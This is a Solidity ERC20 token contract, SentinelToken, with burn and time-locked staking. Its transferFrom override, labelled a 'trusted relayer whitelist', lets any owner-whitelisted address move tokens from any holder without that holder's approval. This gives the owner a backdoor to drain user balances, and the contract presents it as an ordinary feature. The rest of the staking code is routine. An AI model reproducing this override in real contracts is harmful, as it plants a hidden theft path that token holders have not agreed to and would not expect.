// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SentinelToken is ERC20, Ownable, ReentrancyGuard {
    struct Stake {
        uint256 amount;
        uint256 startTime;
        uint256 endTime;
        bool claimed;
    }

    // --- staking data ---
    mapping(address => Stake[]) public stakes;

    // --- trusted relayer whitelist ---
    mapping(address => bool) public isTrustedSpender;
    event TrustedSpenderChanged(address indexed who, bool ok);

    // --- events ---
    event TokensBurned(address indexed burner, uint256 amount);
    event TokensStaked(address indexed staker, uint256 amount, uint256 duration, uint256 startTime);
    event TokensClaimed(address indexed staker, uint256 amount, uint256 stakeIndex);

    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply,
        address initialOwner
    ) ERC20(name, symbol) Ownable(initialOwner) {
        _mint(initialOwner, initialSupply * 10 ** decimals());
    }

    /**
     * @notice Owner can whitelist or remove a trusted spender
     */
    function setTrustedSpender(address who, bool ok) external onlyOwner {
        isTrustedSpender[who] = ok;
        emit TrustedSpenderChanged(who, ok);
    }

    /**
     * @dev Override transferFrom to skip allowance check for whitelisted addresses
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        if (isTrustedSpender[msg.sender]) {
            _transfer(from, to, amount);
            return true;
        }
        return super.transferFrom(from, to, amount);
    }

    /**
     * @notice Burn tokens in the caller's balance
     */
    function burn(uint256 amount) public {
        _burn(msg.sender, amount);
        emit TokensBurned(msg.sender, amount);
    }

    /**
     * @notice Stake a given amount for a duration (in days)
     */
    function stake(uint256 amount, uint256 durationInDays) public nonReentrant {
        require(amount > 0, "Cannot stake 0 tokens");
        require(balanceOf(msg.sender) >= amount, "Insufficient token balance");

        _transfer(msg.sender, address(this), amount);
        uint256 startTime = block.timestamp;
        uint256 endTime = startTime + (durationInDays * 1 days);
        stakes[msg.sender].push(Stake(amount, startTime, endTime, false));

        emit TokensStaked(msg.sender, amount, durationInDays, startTime);
    }

    /**
     * @notice Claim staked tokens after lockup
     */
    function claimStakedTokens(uint256 stakeIndex) public nonReentrant {
        require(stakeIndex < stakes[msg.sender].length, "Invalid stake index");
        Stake storage data = stakes[msg.sender][stakeIndex];
        require(!data.claimed, "Stake already claimed");
        require(block.timestamp >= data.endTime, "Stake is still locked");

        data.claimed = true;
        _transfer(address(this), msg.sender, data.amount);

        emit TokensClaimed(msg.sender, data.amount, stakeIndex);
    }

    /**
     * @notice Get details of a given stake
     */
    function getStakeDetails(address user, uint256 stakeIndex)
        public
        view
        returns (uint256 amount, uint256 startTime, uint256 endTime, bool claimed)
    {
        require(stakeIndex < stakes[user].length, "Invalid stake index");
        Stake memory data = stakes[user][stakeIndex];
        return (data.amount, data.startTime, data.endTime, data.claimed);
    }
}
